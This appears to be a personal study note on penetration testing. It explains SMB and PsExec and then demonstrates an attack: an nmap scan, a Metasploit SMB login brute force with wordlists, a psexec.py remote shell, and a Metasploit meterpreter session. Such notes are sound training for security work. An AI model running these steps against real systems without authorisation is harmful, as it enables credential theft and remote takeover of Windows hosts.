---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# Exploiting SMB with PsExec

## SMB understanding

- Server Message Block: a network file sharing protocol used to facilitate the sharing of files on a network
- SMB uses port 445 (TCP) but can also ran on top of NetBIOS port 139
- SAMBA is the open source Linux implementation of SMB and allows Windows systems to access Linux shares and devices

### Authentication

- 2 levels of authentication
	- User Authentication
		- Users must provide a username and password in order to access a share
	- Share Authentication
		- Users must provide a password in order to access restricted share

## PsExec introduction

- [[PsExec]] is a lightweight telnet-replacement that allows you to execute processes on remote windows systems using any user's credentials
- Authentication is performed via SMB
- PsExec can be used to authenticate with the target and run commands or launch a remote command prompt
- Very similar to RDP but without GUI

## SMB Exploitation with PsExec

- To utilize PsExec we must first gain access to a Windows target and identify legitimate user accounts and their passwords or password hashes
- It can be done using various techniques but the most common is to do an SMB login brute force attack
- Every Windows machines have an `Administrator` account
- Only after obtaining credentials we can use PsExec

## Demonstration

Identify open ports:

```bash
nmap -sV -sC <ip>
```

SMB running on port 445.

Run [[Metasploit]]:

```bash
> use auxiliary/scanner/smb/smb_login
> set RHOSTS <ip>
> set USER_FILE common_users.txt
> set PASS_FILE unix_passwords.txt
> set VERBOSE false # to only print succeed
```

Now that we have valid credentials:

```bash
$ psexec.py <username>@<ip> cmd.exe
Password:
C:\Windows\system32>
```

To open a meterpreter session:

```bash
> use exploit/windows/smb/psexec
> set RHOSTS <ip>
> set SMBUser <username>
> set SMBPass <password>
```
